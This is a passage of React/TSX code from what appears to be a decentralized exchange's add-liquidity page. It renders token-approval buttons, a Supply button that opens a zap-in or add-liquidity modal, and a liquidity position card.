                            {approvalA === ApprovalState.PENDING ? (
                              <Dots>{t('Enabling %asset%', { asset: currencies[Field.CURRENCY_A]?.symbol })}</Dots>
                            ) : (
                              t('Enable %asset%', { asset: currencies[Field.CURRENCY_A]?.symbol })
                            )}
                          </Button>
                        )}
                        {showFieldBApproval && (
                          <Button
                            onClick={approveBCallback}
                            disabled={approvalB === ApprovalState.PENDING}
                            width="100%"
                          >
                            {approvalB === ApprovalState.PENDING ? (
                              <Dots>{t('Enabling %asset%', { asset: currencies[Field.CURRENCY_B]?.symbol })}</Dots>
                            ) : (
                              t('Enable %asset%', { asset: currencies[Field.CURRENCY_B]?.symbol })
                            )}
                          </Button>
                        )}
                      </RowBetween>
                    )}
                    <Button
                      isLoading={preferZapInstead && zapInEstimating}
                      variant={!isValid || zapIn.priceSeverity > 2 ? 'danger' : 'primary'}
                      style={{
                        background: '#101528',
                      }}
                      onClick={() => {
                        if (preferZapInstead) {
                          setLiquidityState({
                            attemptingTxn: false,
                            liquidityErrorMessage: undefined,
                            txHash: undefined,
                          })
                          onPresentZapInModal()
                          return
                        }
                        if (expertMode) {
                          onAdd()
                        } else {
                          setLiquidityState({
                            attemptingTxn: false,
                            liquidityErrorMessage: undefined,
                            txHash: undefined,
                          })
                          onPresentAddLiquidityModal()
                        }
                      }}
                      disabled={buttonDisabled}
                    >
                      {/*  */}
                      {errorText || t('Supply')}
                    </Button>
                  </AutoColumn>
                )}
              </AutoColumn>
            </CardBody>
          </>
        )}
      </AppBody>
      {!(addIsUnsupported || addIsWarning) ? (
        pair && !noLiquidity && pairState !== PairState.INVALID ? (
          <AutoColumn style={{ minWidth: '20rem', width: '100%', maxWidth: '400px', marginTop: '1rem' }}>
            <MinimalPositionCard showUnwrapped={oneCurrencyIsWBNB} pair={pair} />
          </AutoColumn>
        ) : null
      ) : (
        <UnsupportedCurrencyFooter currencies={[currencies.CURRENCY_A, currencies.CURRENCY_B]} />
      )}
    </Page>
  )
}
